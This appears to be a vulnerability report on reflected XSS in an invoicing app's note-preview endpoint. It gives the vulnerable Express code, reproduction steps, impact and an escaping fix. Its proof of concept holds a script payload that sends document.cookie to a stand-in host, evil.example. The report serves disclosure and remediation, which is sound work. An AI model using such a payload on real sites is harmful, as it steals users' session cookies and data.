# Reflected XSS in note preview executes attacker script

## Summary

The note-preview endpoint takes the note you post and drops it into an HTML response without encoding it. Express serves that string as `text/html`, so a `<script>` in the note runs in the browser that renders the preview. Feed a victim a crafted note (or a link that posts one) and your JavaScript runs in their session.

## Vulnerability details

- **Type / CWE:** Reflected cross-site scripting (CWE-79).
- **Severity:** Medium. `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1. Needs the victim to trigger the render, hence UI:R; scope changes because it executes in the victim's browser context.
- **Affected endpoint:** `POST /invoices/:id/note/preview`, JSON field `note`.
- **Authentication:** none to reach the endpoint; exploitation runs in the victim's authenticated session.

## Description

The handler interpolates the note straight into the response body:

```ts
const note = req.body?.note;
res.send(`<!doctype html><div class="note-preview">${note}</div>`);
```

`res.send` with a string sets `Content-Type: text/html`, so the browser parses the result as markup. Nothing encodes `<`, `>`, or quotes, so any HTML in `note` is live: a `<script>` tag, an `onerror` handler, an `<iframe>`. This is the reflected variant — the payload comes in and goes back out in the same response. (Storing the note and rendering it later from the database is the same bug with a stored blast radius.)

## Steps to reproduce

1. Post a note containing a script tag to the preview endpoint:
   ```bash
   curl -X POST 'http://localhost:3000/invoices/1/note/preview' \
     -H 'Content-Type: application/json' \
     -d '{"note":"<script>alert(document.domain)</script>"}'
   ```
2. Look at the response body. The `<script>` tag comes back verbatim, and the content type is `text/html`.
3. Deliver the same request through the victim's browser (a page that auto-submits the form, or the app's own preview UI) and the script executes in their session.

## Proof of concept

Request:
```
POST /invoices/1/note/preview HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{ "note": "<script>fetch('https://evil.example/c?'+document.cookie)</script>" }
```

Response:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!doctype html><div class="note-preview"><script>fetch('https://evil.example/c?'+document.cookie)</script></div>
```

The script is returned unescaped inside a `text/html` body, so it runs on render.

## Impact

Script running in a victim's authenticated session can do what the victim can: read the page and its data, make authenticated requests as them, steal session cookies or tokens if they're reachable, or draw a convincing fake login over the real app to harvest credentials. In an invoicing product that means acting on another user's account and exfiltrating their financial data. Reflected delivery needs the victim to open a crafted request, but that's a normal phishing step, and the payload runs on the app's own origin so same-origin protections don't help the victim.

## Remediation

Encode on output. Escape HTML metacharacters so the note renders as text, not markup:

```ts
import { escapeHtml } from '../security/html';
res.send(`<!doctype html><div class="note-preview">${escapeHtml(note)}</div>`);
```

Escaping is context-specific: this is correct for HTML text, but a value going into an attribute, a URL, or inline JS needs the encoder for that context, or a templating engine that auto-escapes. A tight `Content-Security-Policy` is good defense in depth but not a substitute for encoding.

## References

- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- OWASP Top 10: A03:2021 Injection
